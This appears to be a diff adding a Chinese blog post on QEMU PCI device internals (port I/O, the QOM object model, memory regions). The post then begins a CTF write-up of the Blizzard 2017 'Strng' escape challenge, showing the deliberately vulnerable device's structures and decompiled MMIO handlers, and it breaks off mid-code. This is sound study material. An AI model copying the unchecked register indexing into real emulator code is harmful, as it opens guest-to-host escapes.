+<h4 id="访问pmio"><a href="#访问pmio" class="headerlink" title="访问pmio"></a>访问pmio</h4><p>内核态访问使用in<em>/out</em>函数访问某个端口</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">inb(port);  <span class="comment">//读取一字节</span></span><br><span class="line">inw(port);  <span class="comment">//读取两字节</span></span><br><span class="line">inl(port);  <span class="comment">//读取四字节</span></span><br><span class="line"></span><br><span class="line">outb(val,port); <span class="comment">//写一字节</span></span><br><span class="line">outw(val,port); <span class="comment">//写两字节</span></span><br><span class="line">outl(val,port); <span class="comment">//写四字节</span></span><br></pre></td></tr></table></figure>
+<p>用户态访问要先调用<code>iopl</code>申请访问大于0x3ff的端口</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h &gt;</span></span></span><br><span class="line"></span><br><span class="line">iopl(<span class="number">3</span>); </span><br><span class="line">inb(port); </span><br><span class="line">inw(port); </span><br><span class="line">inl(port);</span><br><span class="line"></span><br><span class="line">outb(val,port); </span><br><span class="line">outw(val,port); </span><br><span class="line">outl(val,port);</span><br></pre></td></tr></table></figure>
+<h3 id="QOM编程模型"><a href="#QOM编程模型" class="headerlink" title="QOM编程模型"></a>QOM编程模型</h3><p>QEMU提供了一套面向对象编程的模型——QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p>
+<p>有几个结构体比较关键，<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。</p>
+<p><code>TypeInfo</code>是用户用来定义一个Type的数据结构，用户定义一个<code>TypeInfo</code>，然后调用<code>type_register(TypeInfo)</code>或者<code>type_register_static(TypeInfo)</code>函数，就会生成相应的TypeImpl实例，将这个<code>TypeInfo</code>注册到全局的<code>TypeImpl</code>的<code>hash</code>表中。</p>
+<p><code>TypeImpl</code>的属性与TypeInfo的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl对象。如下面定义的<code>pci_test_dev</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo pci_testdev_info = &#123;</span><br><span class="line">        .name          = TYPE_PCI_TEST_DEV,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(PCITestDevState),</span><br><span class="line">        .class_init    = pci_testdev_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register_static</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> type_register(info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(info-&gt;parent);</span><br><span class="line">    <span class="keyword">return</span> type_register_internal(info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> TypeImpl *<span class="title">type_register_internal</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = type_new(info);</span><br><span class="line">    type_table_add(ti);</span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当所有qemu总线、设备等的<code>type_register_static</code>执行完成后，即它们的<code>TypeImpl</code>实例创建成功后，qemu就会在<code>type_initialize</code>函数中实例化其对应的<code>ObjectClass</code>。</p>
+<p>每个<code>type</code>都有一个相应的ObjectClass对应，它是所有类的基类。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;  </span><br><span class="line">    GSList *interfaces;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>用户可以定义自己的类，继承相应类即可。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span> *<span class="title">Type</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span> <span class="title">ObjectClass</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type's instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> &#123;</span></span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+<p>可以看到类的定义中父类都在第一个字段，使得可以父类与子类直接实现转换。一个类初始化时会先初始化它的父类，父类初始化完成后，会将相应的字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值。同时也会继承父类相应的虚函数指针，当所有的父类都初始化结束后，<code>TypeInfo::class_init</code>会调用以实现虚函数的初始化，如下面的<code>pci_testdev_class_init</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_testdev_class_init</span><span class="params">(ObjectClass *klass, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">        PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line">        k-&gt;init = pci_testdev_init;</span><br><span class="line">        k-&gt;<span class="built_in">exit</span> = pci_testdev_uninit;</span><br><span class="line">        ...</span><br><span class="line">        dc-&gt;desc = <span class="string">"PCI Test Device"</span>;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后是<code>Object</code>对象</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="keyword">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>之前提到的<code>Type</code>以及<code>ObjectClass</code>只是一个类型，而不是具体的设备。<code>TypeInfo</code>结构体中有两个函数指针：<code>instance_init</code>以及<code>class_init</code>。<code>class_init</code>负责初始化<code>ObjectClass</code>结构体，<code>instance_init</code>负责初始化具体<code>Object</code>结构体。</p>
+<blockquote>
+<p>the Object constructor and destructor functions (registered by the respective Objectclass constructors) will now only get called if the corresponding PCI device’s -device option was specified on the QEMU command line (unless, probably, it is a default PCI device for the machine).<br>Object类的构造函数与析构函数（在Objectclass构造函数中注册的）只有在命令中-device指定加载该设备后才会调用（或者它是该系统的默认加载PCI设备）。<br><code>Object</code>示例如下：</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Object</span> <span class="title">Object</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass *<span class="class"><span class="keyword">class</span>;</span> <span class="comment">/* points to the Type's ObjectClass instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/qemu/typedefs.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> <span class="title">DeviceState</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> <span class="title">PCIDevice</span>;</span></span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Object parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> &#123;</span></span><br><span class="line">        DeviceState qdev;</span><br><span class="line">        ...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">YourDeviceState</span>&#123;</span></span><br><span class="line">        PCIDevice pdev;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>（QOM will use instace_size as the size to allocate a Device Object, and then it invokes the instance_init ）</p>
+</blockquote>
+<p>QOM会为设备<code>Object</code>分配<code>instance_size</code>大小的空间，然后调用<code>instance_init</code>函数（在<code>ObjectClass</code>的<code>class_init</code>函数中定义）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+<p>最后是PCI的内存空间，qemu使用MemoryRegion表示内存空间，使用<code>MemoryRegionOps</code>结构体来对内存的操作进行表示，如<code>PMIO</code>或<code>MMIO</code>。对每个<code>PMIO</code>或者<code>MMIO</code>操作都需要相应的<code>MemoryRegionOps</code>结构体，其中包含相应的<code>read/write</code>回调函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_mmio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_mmio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_pio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_pio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>首先用<code>memory_region_init_io</code>函数初始化内存空间(MemoryRegion结构体)，记录空间大小，注册相应的读写函数等；然后调用<code>pci_register_bar</code>来注册BAR等信息。需要指出的无论是MMIO还是PMIO，其对应的空间都需要显式的指出（即静态生命或动态分配），因为memory_region_init_io只是记录空间大小而并不分配。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hw/misc/pci-testdev.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_IOSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_MEMSIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCITestDevState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        PCIDevice parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">        MemoryRegion mmio;</span><br><span class="line">        MemoryRegion portio;</span><br><span class="line">        IOTest *tests;</span><br><span class="line">        <span class="keyword">int</span> current;</span><br><span class="line">&#125; PCITestDevState;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br><span class="line">        memory_region_init_io(&amp;d-&gt;mmio, OBJECT(d), &amp;pci_testdev_mmio_ops, d,</span><br><span class="line">                                                    <span class="string">"pci-testdev-mmio"</span>, IOTEST_MEMSIZE * <span class="number">2</span>); </span><br><span class="line">        memory_region_init_io(&amp;d-&gt;portio, OBJECT(d), &amp;pci_testdev_pio_ops, d,</span><br><span class="line">                                                    <span class="string">"pci-testdev-portio"</span>, IOTEST_IOSIZE * <span class="number">2</span>); </span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio);</span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;portio);</span><br></pre></td></tr></table></figure>
+<h2 id="Blizzard-CTF-2017-Strng"><a href="#Blizzard-CTF-2017-Strng" class="headerlink" title="Blizzard CTF 2017 Strng"></a>Blizzard CTF 2017 Strng</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>最开始用type_init调用pci_strng_register_types初始化一个type_info，在结构体中要给出strng_init和class_init方法，之后调用type_register_static添加type</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">type_init(pci_strng_register_types)</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_strng_register_types</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> TypeInfo strng_info = &#123;</span><br><span class="line">        .name          = <span class="string">"strng"</span>,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(STRNGState),</span><br><span class="line">        .instance_init = strng_instance_init,</span><br><span class="line">        .class_init    = strng_class_init,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    type_register_static(&amp;strng_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>strng_class_init初始化一个ObjectClass，赋值<code>pci_strng_realize</code>;赋给设备一个vendor_id、device_id、class_id等唯一标识。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">strng_class_init</span><span class="params">(ObjectClass *class, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_strng_realize;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e9</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>strng_instance_init初始化一个Object实例，给函数指针赋值。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">strng_instance_init</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STRNGState *strng = STRNG(obj);</span><br><span class="line"></span><br><span class="line">    strng-&gt;srand = srand;</span><br><span class="line">    strng-&gt;rand = rand;</span><br><span class="line">    strng-&gt;rand_r = rand_r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>pci_strng_realize首先用<code>memory_region_init_io</code>函数初始化内存空间(MemoryRegion结构体)，记录空间大小，注册相应的读写函数等；然后调用<code>pci_register_bar</code>来注册BAR等信息。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_strng_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;mmio, OBJECT(strng), &amp;strng_mmio_ops, strng, <span class="string">"strng-mmio"</span>, STRNG_MMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;strng-&gt;mmio);</span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;pmio, OBJECT(strng), &amp;strng_pmio_ops, strng, <span class="string">"strng-pmio"</span>, STRNG_PMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;strng-&gt;pmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>strng_mmio_ops</code>和<code>strng_pmio_ops</code>给了读写mmio和pmio的函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps strng_mmio_ops = &#123;</span><br><span class="line">    .read = strng_mmio_read,</span><br><span class="line">    .write = strng_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps strng_pmio_ops = &#123;</span><br><span class="line">    .read = strng_pmio_read,</span><br><span class="line">    .write = strng_pmio_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>最后看下设备的结构体，后面跟了三个函数指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line">    MemoryRegion pmio;</span><br><span class="line">    <span class="keyword">uint32_t</span> addr;</span><br><span class="line">    <span class="keyword">uint32_t</span> regs[STRNG_MMIO_REGS];</span><br><span class="line">    <span class="keyword">void</span> (*srand)(<span class="keyword">unsigned</span> <span class="keyword">int</span> seed);</span><br><span class="line">    <span class="keyword">int</span> (*rand)(<span class="keyword">void</span>);</span><br><span class="line">    <span class="keyword">int</span> (*rand_r)(<span class="keyword">unsigned</span> <span class="keyword">int</span> *seed);</span><br><span class="line">&#125; STRNGState;</span><br></pre></td></tr></table></figure>
+<p>先来看下mmio的读写操作(反编译之后记得将opaque结构体转成STRNGState *类型方便查看).</p>
+<p>mmio_read:如果<code>addr</code>是<code>4</code>的倍数，就返回<code>regs[addr&gt;&gt;2]</code>，其他情况返回-1。</p>
+<p>mmio_write:如果<code>addr</code>是<code>4</code>的倍数，取<code>i</code>为<code>addr&gt;&gt;2</code>。</p>
+<ol>
+<li>如果<code>i</code>为<code>1</code>,调用里面的<code>rand</code>函数，参数为<code>(opaque,i,val)</code>，结果存储在<code>regs[1]</code>里。</li>
+<li>如果<code>i</code>为<code>0</code>,调用里面的<code>srand</code>函数，参数为<code>val</code></li>
+<li>如果<code>i</code>为<code>3</code>,调用里面的<code>rand_r</code>函数，参数为<code>&amp;regs[2]</code>，<code>regs[3]</code>存储函数返回值，<code>regs[i]</code>存储<code>val</code></li>
+<li>其他情况直接把<code>val</code>赋值给<code>regs[i]</code></li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">strng_mmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )</span><br><span class="line">    result = opaque-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">strng_mmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  hwaddr v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v6; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;regs[<span class="number">1</span>] = ((__int64 (__fastcall *)(STRNGState *, hwaddr, <span class="keyword">uint64_t</span>))opaque-&gt;rand)(opaque, v4, val);</span><br><span 